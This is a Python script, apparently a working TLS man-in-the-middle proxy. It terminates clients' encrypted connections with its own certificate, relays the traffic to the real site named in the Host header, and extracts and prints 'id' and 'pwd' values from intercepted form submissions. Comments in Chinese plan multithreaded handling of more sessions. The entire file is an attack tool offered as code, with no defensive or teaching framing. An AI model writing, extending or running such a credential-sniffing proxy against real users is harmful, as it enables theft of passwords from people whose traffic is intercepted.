import ssl
import socket
import subprocess
import threading
import re
from urllib.parse import parse_qs

def start_ssl_server():
    def get_hostname_from_request(data):
        try:
            headers = data.decode().split('\r\n')
            for header in headers:
                if header.startswith('Host:'):
                    hostname = header.split('Host: ')[1]
                    return hostname
        except UnicodeDecodeError:
            pass
        return None

    def get_id_pwd(data):
        parsed_dict = parse_qs(data)
        id_value = parsed_dict.get('id', [''])[0]
        pwd_value = parsed_dict.get('pwd', [''])[0]
        if id_value and pwd_value:
            print(f"ID: {id_value}, Password: {pwd_value}")
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="certificates/host.crt", keyfile="certificates/host.key")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8080))
    s.listen(5)
    print("SSL server listening on port 8080")

    while True:
        try:
            client_socket, addr = s.accept()
            ssl_socket = context.wrap_socket(client_socket, server_side=True)
            print(f"Accepted connection from {addr}")
            ssl_socket.settimeout(0.01)
            try:
                init_requst = ssl_socket.recv(4196)
                # print(init_requst)
                hostname = get_hostname_from_request(init_requst)
                server_socket = create_ssl_connection(hostname)
                server_socket.send(init_requst)
            except socket.timeout:
                print("Timeout occurred12312312")
                continue
            server_socket.settimeout(0.1)
            while True:
                try:
                    data1 = ssl_socket.recv(4196)
                    if data1: 
                        # 先把ssl收起來再把它給Server
                        # 之後用在用multithread handle multi session
                        # print('data1',data1)
                        server_socket.send(data1)
                        get_id_pwd(data1.decode())
                except socket.timeout:
                    # print("data 1 Timeout occurred")
                    pass
                try:            
                    data2 = server_socket.recv(4196)
                    if data2: ssl_socket.send(data2)
                    # print('data2',data2)
                    # print(f"Data1: {len(data1)} bytes, data2: {len(data2)} bytes")
                    # if not data1 and not data1: 
                        # print("Closing connection")
                        # break
                except socket.timeout:
                    # print("data 2 Timeout occurred")
                    pass
                except Exception as e:
                    print(f"An error occurred during data transfer: {e}")
                    break


        except ssl.SSLError as e:
            print(f"SSL error occurred: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            server_socket.close()
            ssl_socket.close()
            
def create_ssl_connection(h):
    hostname = h
    print(h)
    port = 443
    context = ssl.create_default_context()
    sock = socket.create_connection((hostname, port))
    ssl_sock = context.wrap_socket(sock, server_hostname=hostname)
    print(f"SSL connection established with {hostname}")
    ip_address = socket.gethostbyname(hostname)
    print(f"IP address of {hostname} is {ip_address}")
    return ssl_sock


start_ssl_server()